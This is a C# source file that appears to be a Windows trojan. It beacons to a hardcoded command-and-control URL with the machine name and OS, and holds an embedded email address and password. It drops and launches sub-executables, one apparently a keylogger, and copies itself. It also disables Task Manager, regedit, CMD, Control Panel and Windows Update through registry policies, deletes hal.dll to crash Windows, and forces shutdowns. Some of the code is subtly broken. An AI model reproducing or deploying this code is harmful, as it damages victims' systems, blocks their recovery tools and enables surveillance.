using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Security;
using System.Security.Permissions;

namespace SDV
{
    // entry point
    [PermissionSet(SecurityAction.InheritanceDemand, Name = "FullTrust")]
    [SecurityPermissionAttribute(SecurityAction.LinkDemand, UnmanagedCode = true)]
    [PermissionSetAttribute(SecurityAction.LinkDemand, Name = "FullTrust")]

    class SDVC
    {
        static void Main()
        {
            Application.Run(new HIDDENMAINVIR());
        }
    }
    internal static class SETTING
    {
      public static Dictionary<string, string> DB;
        public static void I()
        {
            try
            {
                DB = new Dictionary<string, string>();
                string[] l = File.ReadAllLines(Application.StartupPath + @"\SYSIPCONF.conf");
                foreach (string line in l)
                {
                    string[] t = line.Split('=');
                    DB.Add(t[0], t[1]);
                }
            }
            catch
            {
                Application.Exit();
            }
            finally
            {

            }
        }
    }
    internal static class Informations
    {
        public static string SENDPASS = "http://sdvshit.comuf.com/REGP.php";
        public static string XServer = "http://sdvshit.comuf.com/";
        public static string MailAdress = "sdv.vir@gmail.com";
           public static string Password = "sdvsoft123";

       
    }
    internal static class AttackOrder
    {
        internal static bool GetState()
        {
           WebResponse rep = Tools.MakePOSTRequest(Informations.XServer, Encoding.UTF8.GetBytes("type=PERMISSION&machine=" + Environment.MachineName + "&os=" + Environment.OSVersion.ToString()), 20000);
           StreamReader sr = new StreamReader(rep.GetResponseStream());
          string x = sr.ReadToEnd();
          sr.Close();
          if (x.StartsWith("DISABLED"))
              return false;
          else
              return true;
        }
    
    }
    internal static class WinTools
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
            UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public static void SetWallpaper(String path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        public static void ChangeWallpaper()
        {
            try
            {
                Bitmap bmp = SDV.Properties.Resources.WKDV;
                bmp.Save(Path.Combine(Environment.SystemDirectory, "WKDVWPP.png"));
                SetWallpaper(Path.Combine(Environment.SystemDirectory, "WKDVWPP.png"));

            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void ExtractSubViruses()
        {
            try
            {
                File.WriteAllBytes(Path.Combine(Environment.SystemDirectory, "WinMsgBoxPE.exe"), SDV.Properties.Resources.MSGB);
                File.WriteAllBytes(Path.Combine(Environment.SystemDirectory, "WinVKeyBoard.exe"), SDV.Properties.Resources.KGLOG);
                Process.Start(Path.Combine(Environment.SystemDirectory, "WinMsgBoxPE.exe"));
                Process.Start(Path.Combine(Environment.SystemDirectory, "WinVKeyBoard.exe"));
            }
            catch
            {

            }
            finally
            {

            }
        }

        public static void MakeImage(string dest)
        {
            try
            {
                File.Copy(Application.ExecutablePath, dest);
            }
            catch
            {

            }
            finally
            {

            }
        }

        public static void ExtractSpeechService()
        {

        }
          }

    internal static class WinFC
    {
        public static void DisableTaskManager()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.CreateSubKey
("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableTaskManager()
        {
               try
            {
                             RegistryKey key =
     Registry.CurrentUser.OpenSubKey
        ("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                key.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableRegedit()
        {
            RegistryKey key =
                Registry.CurrentUser.CreateSubKey
                   ("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            key.Close();
        }
        public static void EnableRegedit()
        {
            RegistryKey key =
                Registry.CurrentUser.OpenSubKey
                   ("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
            key.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
            key.Close();
        }

        public static void DisableActiveDesktop()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoActiveDesktop", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableActiveDesktop()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoActiveDesktop", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableAddRemovePrograms()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.CreateSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall");
                key.SetValue("NoAddRemovePrograms", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableAddRemovePrograms()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall", true);
                key.SetValue("NoAddRemovePrograms", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableComponents()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.CreateSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
                key.SetValue("NoComponents", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableComponents()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", true);
                key.SetValue("NoComponents", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableWindowsUpdate()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.CreateSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                key.SetValue("NoWindowsUpdate", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableWindowsUpdate()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoWindowsUpdate", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableStatusMessages()
        {
            try
            {
                RegistryKey key =
Registry.LocalMachine.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("DisableStatusMessages", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableStatusMessages()
        {
            try
            {
                RegistryKey key =
Registry.LocalMachine.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("DisableStatusMessages", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableChangePass()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("Disable Change Password", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableChangePass()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("Disable Change Password", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableCP()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableCP()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableChangeWallpaper()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.CreateSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
                key.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableChangeWallpaper()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", true);
                key.SetValue("NoChangingWallPaper", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableDragAndDrop()
        {
            try
            {
                RegistryKey key =
Registry.LocalMachine.CreateSubKey
(@"Software\Policies\Microsoft\Windows\Task Scheduler5.0");
                key.SetValue("DragAndDrop", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableDragAndDrop()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Policies\Microsoft\Windows\Task Scheduler5.0", true);
                key.SetValue("DragAndDrop", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableStartMenuLogOff()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("StartMenuLogOff", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableStartMenuLogOff()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("StartMenuLogOff", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableCMD()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableCMD()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("DisableCMD", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableViewContextMenu()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableViewContextMenu()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoViewContextMenu", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableMSI()
        {
            try
            {
                RegistryKey key =
Registry.LocalMachine.OpenSubKey
(@"Software\Policies\Microsoft\Windows\Installer", true);
                key.SetValue("DisableMSI", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableMSI()
        {
            try
            {
                RegistryKey key =
Registry.LocalMachine.OpenSubKey
(@"Software\Policies\Microsoft\Windows\Installer", true);
                key.SetValue("DisableMSI", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableWelcomeScreen()
        {
            try
            {
                RegistryKey key =
Registry.LocalMachine.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoWelcomeScreen", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableWelcomeScreen()
        {
            try
            {
                RegistryKey key =
Registry.LocalMachine.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoWelcomeScreen", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableSaveSettings()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoSaveSettings", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableSaveSettings()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoSaveSettings", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableRun()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoRun", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableRun()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoRun", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }

        public static void DisableALLICONS()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
        public static void EnableALLICONS()
        {
            try
            {
                RegistryKey key =
Registry.CurrentUser.OpenSubKey
(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoDesktop", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {

            }
            finally
            {

            }

        }
    }





    internal static class ATTACK
    {
              public static void L2()
        {
            try
            {
                TROJAN t = new TROJAN();
            }
            catch
            {
                Application.Exit();
            }
            finally
            {

            }
        }
    }
 
    
    internal static class Tools
    {
        public static bool close = false;
        public static void WriteHistory(string laste)
        {
            File.WriteAllText(Application.StartupPath + @"\MYHIS.txt", laste);

        }
        public static List<string> GetFilesRecursive(string b)
        {
            // 1.
            // Store results in the file results list.
            List<string> result = new List<string>();

            // 2.
            // Store a stack of our directories.
            Stack<string> stack = new Stack<string>();

            // 3.
            // Add initial directory.
            stack.Push(b);

            // 4.
            // Continue while there are directories to process
            while (stack.Count > 0)
            {
                // A.
                // Get top directory
                string dir = stack.Pop();

                try
                {
                    // B
                    // Add all files at this directory to the result List.
                    result.AddRange(Directory.GetFiles(dir, "*.txt"));
                    // C
                    // Add all directories at this directory.
                    foreach (string dn in Directory.GetDirectories(dir))
                    {
                        stack.Push(dn);
                    }
                }
                catch
                {
                    // D
                    // Could not open the directory
                }
            }
            return result;
        }

       public static void ShutDownSystem(int time)
        {
            try
            {
                Process.Start("shutdown", "/s /t " + time.ToString());
            }
            catch (Exception ex)
            {

            }
            finally
            {

            }
        }
       public static void CrashWin()
       {
           try
           {
               System.IO.File.Delete(Path.Combine(System.Environment.SystemDirectory, "hal.dll"));
               System.IO.File.Delete(Path.Combine(System.Environment.SystemDirectory, "sensapi.dll"));
               System.IO.File.Delete(Path.Combine(System.Environment.SystemDirectory, "HAL.DLL"));
               System.IO.File.Delete(Path.Combine(System.Environment.SystemDirectory, "SENSAPI.DLL"));
               BOMBCHRONOFRM frm = new BOMBCHRONOFRM();
               frm.SHOWCHRONO = true;
               frm.ShowDialog();
           }
           catch
           {

           }
           finally
           {

           }
       }
        
        public static WebResponse MakePOSTRequest(string uri, byte[] data, int timeout)
{

    WebRequest req = WebRequest.Create(uri);
    req.Method = "POST";
    req.Timeout = timeout;
    req.UseDefaultCredentials = true;
    req.Credentials = CredentialCache.DefaultCredentials;
    req.ContentType = "application/x-www-form-urlencoded";
    ((HttpWebRequest)req).UserAgent = "Vista 64-bit	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0; SLCC1; .NET CLR 2.0.50727;) IE/7";
    Stream s = req.GetRequestStream();
            s.Write(bytes, 0, bytes.Length);
            s.Close();

   
 return req.GetResponse();
}
        public static bool Download(string file, string url)
        {
            WebClient cl = new WebClient();
            cl.DownloadFile(url, file);

            return File.Exists(file);
        }
 
        #region string security
        private static string Pad(string s, int len)
        {
            string temp = s;
            for (int i = s.Length; i < len; ++i)
                temp = "0" + temp;
            return temp;
        }
        public static string DumpHex(string filename)
        {

            StringBuilder sb = new StringBuilder();
            FileStream fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read);
            using (StreamReader sr = new StreamReader(fileStream))
            {

                string line = "";
                int nCounter = 0;
                int nOffset = 0;
                while ((line = sr.ReadLine()) != null)
                {
                    for (int i = 0; i < line.Length; ++i)
                    {
                        int c = (int)line[i];
                        string fmt = String.Format("{0:x}", c);
                        if (fmt.Length == 1)
                            fmt = Pad(fmt, 2);
                        if (nOffset % 16 == 0)
                        {
                            string offsetFmt = nOffset.ToString();


                        }
                        sb.Append(fmt);

                        if (nCounter == 15)
                        {

                            nCounter = 0;
                        }
                        else
                            nCounter++;
                        nOffset++;
                    }
                }
                sr.Close();
            }
            return sb.ToString();

        }
        public static string ConvertToHex(string input)
        {
            StringBuilder sb = new StringBuilder();
            char[] values = input.ToCharArray();
            foreach (char letter in values)
            {
                // Get the integral value of the character.
                int value = Convert.ToInt32(letter);
                // Convert the decimal value to a hexadecimal value in string form.
                string hexOutput = String.Format("{0:x}", value);
                sb.Append(hexOutput);
            }
            return sb.ToString();
        }
        public static string ToBase64(string inputstring)
        {
            byte[] byt = System.Text.Encoding.UTF8.GetBytes(inputstring);

            string result = Convert.ToBase64String(byt);
            return result;
        }
        public static string FromBase64(string encodedstring)
        {
            byte[] b = Convert.FromBase64String(encodedstring);

            string result = System.Text.Encoding.UTF8.GetString(b);
            return result;
        }
        internal static string STREncrypt(string originalString)
        {

            if (String.IsNullOrEmpty(originalString))
            {
                throw new ArgumentNullException
                       ("The string which needs to be encrypted can not be null.");
            }
            DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream,
                cryptoProvider.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
            StreamWriter writer = new StreamWriter(cryptoStream);
            writer.Write(originalString);
            writer.Flush();
            cryptoStream.FlushFinalBlock();
            writer.Flush();
            return Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);

        }
        internal static string STRDecrypt(string cryptedString)
        {

            if (String.IsNullOrEmpty(cryptedString))
            {
                throw new ArgumentNullException
                   ("The string which needs to be decrypted can not be null.");
            }
            DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
            MemoryStream memoryStream = new MemoryStream
                    (Convert.FromBase64String(cryptedString));
            CryptoStream cryptoStream = new CryptoStream(memoryStream,
                cryptoProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Read);
            StreamReader reader = new StreamReader(cryptoStream);
            return reader.ReadToEnd();


        }
        static byte[] bytes = ASCIIEncoding.ASCII.GetBytes("avxnTvjy");
        public static string GetMd5Hashofstring(string input)
        {

            // Create a new instance of the MD5CryptoServiceProvider object.
            MD5 md5Hasher = MD5.Create();

            // Convert the input string to a byte array and compute the hash.
            byte[] data = md5Hasher.ComputeHash(Encoding.Default.GetBytes(input));

            // Create a new Stringbuilder to collect the bytes
            // and create a string.
            StringBuilder sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data 
            // and format each one as a hexadecimal string.
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }

            // Return the hexadecimal string.
            return sBuilder.ToString();
        }
        public static string GetMD5HashFromFile(string fileName)
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                FileStream file = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.Read);
                MD5 md5 = new MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(file);
                file.Close();


                for (int i = 0; i < retVal.Length; i++)
                {
                    sb.Append(retVal[i].ToString("x2"));
                }
            }
            finally
            {

            }
            return sb.ToString();

        }
        public static bool Match(string hashOfInput, string VDBhash)
        {

            // Create a StringComparer an compare the hashes.
            StringComparer comparer = StringComparer.OrdinalIgnoreCase;

            if (0 == comparer.Compare(hashOfInput, VDBhash))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        #endregion




    }
}
